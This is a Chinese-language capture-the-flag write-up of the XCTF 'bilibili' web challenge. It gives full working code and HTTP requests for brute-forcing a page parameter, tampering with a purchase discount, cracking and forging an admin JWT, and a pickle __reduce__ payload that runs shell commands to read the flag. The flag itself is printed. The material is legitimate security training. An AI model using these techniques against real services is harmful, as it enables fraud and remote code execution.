# bilibili

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=e443abc9-92d0-4db2-a44b-823e94a108ef_2)

这题真的是……太草了。

进入网站，我只能说低估了出题人的想象力。（首页那个视频看了好多遍，刻在dna里了还是想看:D）正经起来，有一句提示说要买lv6。翻一下，没看见lv6的小电视啊。不过在翻页后发现url的page参数改变，可以爆破这个参数。检查元素发现lv4的小电视名字叫lv4.png，那lv6的小电视一定叫lv6.png了，根据这个线索爆破。

```python
import requests
target = "http://61.147.171.105:61450/shop?page=%d"
for i in range(500):
    res = requests.get(target%(i)).text
    if "lv6.png" in res:
        print(target%(i))
        break
```

得到page参数为181。注册一个账号，去买个看看。一看发现根本买不起。题目描述说有逻辑漏洞，看逻辑漏洞怎么着都要抓个包看看吧。点击购买，在购物车结算时抓包。

```
POST /shopcar HTTP/1.1
Host: 61.147.171.105:61450
Content-Length: 116
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:61450
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:61450/shopcar
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _xsrf=2|a3eb2d4a|221d581f374175d18ce6420b72a10aca|1665803998; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEifQ.B-OZYHuG5HRg_eOm_FujDz6VVR6xpA1ENW4jZ5D4qxo; commodity_id="2|1:0|10:1665804035|12:commodity_id|8:MTYyNA==|dcb1ad383cf50d5af34398456446f58cf5e919cabaf7c42c7430c9fd418d620e"
Connection: close

_xsrf=2%7C5a31e538%7Cdbc7906dce9bbda3753c8a798b7bc2b8%7C1665803998&id=1624&price=1145141919.0&discount=0.8
```

发现post参数有价格和折扣。改价格发现没用，那就把折扣改成0.00000000000001，结果就买到了。重定向到/b1g_m4mber页面。然而提示只有admin可以访问。一般ctf判断admin用什么呢？cookie之类的东西。看看cookie，只有可能是JWT了。[在线](https://jwt.io/)查看jwt的值。

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "username": "a"
}
```

把username改成admin试试，发现不行。那就是需要secret key了，用[c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)爆破key值，得到1Kun。回到上面那个网站，填写key值，得到的内容粘贴进原来的jwt，刷新后就变成了管理员。继续检查元素，发现给了源码。

```html
<div class="ui text container login-wrap-inf">
<!-- 潜伏敌后已久,只能帮到这了 -->
<a href="/static/asd1f654e683wq/www.zip"><span style="visibility:hidden">删库跑路前我留了好东西在这里</span></a>
```

点击链接，下载到源码。既然我们在admin界面，优先看Admin.py。

```python
import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib


class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
```

原来python里也有[反序列化](https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/),标志就是pickle库。pickle.loads加载一个之前被pickle.dumps后的序列化字符串，重点在于会调用加载对象的__reduce__方法。举个例子。

```python
import os
import pickle
class test(object):
    def __reduce__(self):
        return (os.system,('whoami',))
a=test()
payload=pickle.dumps(a)
print(payload)
pickle.loads(payload)
```

我们dumps的对象a是test类的实例，test类定义的__reduce__方法会执行whoami命令（__reduce__返回值第一个是要调用的函数，第二个是调用函数的参数）。那在loads的时候，就会调用whoami命令。题目的情况和这里差不多，pickle毫无过滤就loads了become数据，那就可以命令执行了。准备payload，注意服务器使用的是python2，因为给的源码也是python2，所以用python2构建payload。先ls，知道文件名后cat flag。

```python
import urllib2
import pickle
class A(object):
    def __reduce__(self):
        # a = "__import__('os').popen('ls').read()"
        a = "__import__('os').popen('cat /flag.txt').read()"
        return (eval,(a,))

print(urllib2.quote(pickle.dumps(A()))) 
```

```
POST /b1g_m4mber HTTP/1.1
Host: 61.147.171.105:61450
Content-Length: 200
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:61450
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:61450/b1g_m4mber
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _xsrf=2|a3eb2d4a|221d581f374175d18ce6420b72a10aca|1665803998; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
Connection: close

_xsrf=2%7C82de3f5d%7C03284a08167467c6add3501c539418dd%7C1665803998&become=c__builtin__%0Aeval%0Ap0%0A%28S%22__import__%28%27os%27%29.popen%28%27cat%20/flag.txt%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
```

- ### Flag
  > flag{dfe54e6fe1e34f1e8fb03c8b50e963bd}